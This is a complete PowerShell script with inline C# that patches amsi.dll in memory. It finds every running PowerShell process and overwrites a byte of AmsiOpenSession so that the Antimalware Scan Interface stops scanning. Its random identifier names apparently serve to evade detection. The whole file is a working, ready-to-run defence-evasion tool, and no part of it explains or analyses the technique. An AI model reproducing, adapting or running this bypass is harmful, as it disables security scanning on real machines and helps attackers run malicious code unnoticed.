Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class Zjdfy
{
    public const int PROCESS_VM_OPERATION = 0x0008;
    public const int PROCESS_VM_READ = 0x0010;
    public const int PROCESS_VM_WRITE = 0x0020;
    public const uint PAGE_EXECUTE_READWRITE = 0x40;

    // NtOpenProcess: Opens a handle to a process.
    [DllImport("ntdll.dll")]
    public static extern int NtOpenProcess(out IntPtr ProcessHandle, uint DesiredAccess, [In] ref OBJECT_ATTRIBUTES ObjectAttributes, [In] ref CLIENT_ID ClientId);

    // NtWriteVirtualMemory: Writes to the memory of a process.
    [DllImport("ntdll.dll")]
    public static extern int NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, uint NumberOfBytesToWrite, out uint NumberOfBytesWritten);

    // NtClose: Closes an open handle.
    [DllImport("ntdll.dll")]
    public static extern int NtClose(IntPtr Handle);

    // LoadLibrary: Loads the specified module into the address space of the calling process.
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr LoadLibrary(string lpFileName);

    // GetProcAddress: Retrieves the address of an exported function or variable from the specified dynamic-link library (DLL).
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    // VirtualProtectEx: Changes the protection on a region of memory within the virtual address space of a specified process.
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [StructLayout(LayoutKind.Sequential)]
    public struct OBJECT_ATTRIBUTES
    {
        public int Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public int Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CLIENT_ID
    {
        public IntPtr UniqueProcess;
        public IntPtr UniqueThread;
    }
}
"@

function Ytspd {
    param (
        [int]$processId
    )

    $patch = [byte]0xEB  # The patch byte to modify AMSI behavior

    $objectAttributes = New-Object Zjdfy+OBJECT_ATTRIBUTES
    $clientId = New-Object Zjdfy+CLIENT_ID
    $clientId.UniqueProcess = [IntPtr]$processId
    $clientId.UniqueThread = [IntPtr]::Zero
    $objectAttributes.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($objectAttributes)

    $hHandle = [IntPtr]::Zero
    $status = [Zjdfy]::NtOpenProcess([ref]$hHandle, [Zjdfy]::PROCESS_VM_OPERATION -bor [Zjdfy]::PROCESS_VM_READ -bor [Zjdfy]::PROCESS_VM_WRITE, [ref]$objectAttributes, [ref]$clientId)

    if ($status -ne 0) {
        return
    }

    $amsiHandle = [Zjdfy]::LoadLibrary("amsi.dll")
    if ($amsiHandle -eq [IntPtr]::Zero) {
        [Zjdfy]::NtClose($hHandle)
        return
    }

    $amsiOpenSession = [Zjdfy]::GetProcAddress($amsiHandle, "AmsiOpenSession")
    if ($amsiOpenSession -eq [IntPtr]::Zero) {
        [Zjdfy]::NtClose($hHandle)
        return
    }

    $patchAddr = [IntPtr]($amsiOpenSession.ToInt64() + 3)

    $oldProtect = [UInt32]0
    $size = [UIntPtr]::new(1)
    $protectStatus = [Zjdfy]::VirtualProtectEx($hHandle, $patchAddr, $size, [Zjdfy]::PAGE_EXECUTE_READWRITE, [ref]$oldProtect)

    if (-not $protectStatus) {
        [Zjdfy]::NtClose($hHandle)
        return
    }

    $bytesWritten = [System.UInt32]0
    $status = [Zjdfy]::NtWriteVirtualMemory($hHandle, $patchAddr, [byte[]]@($patch), 1, [ref]$bytesWritten)

    [Zjdfy]::VirtualProtectEx($hHandle, $patchAddr, $size, $oldProtect, [ref]$oldProtect)
    [Zjdfy]::NtClose($hHandle)
}

function Kljhu {
    Get-Process | Where-Object { $_.ProcessName -eq "powershell" } | ForEach-Object {
        Ytspd -processId $_.Id
    }
}

Kljhu
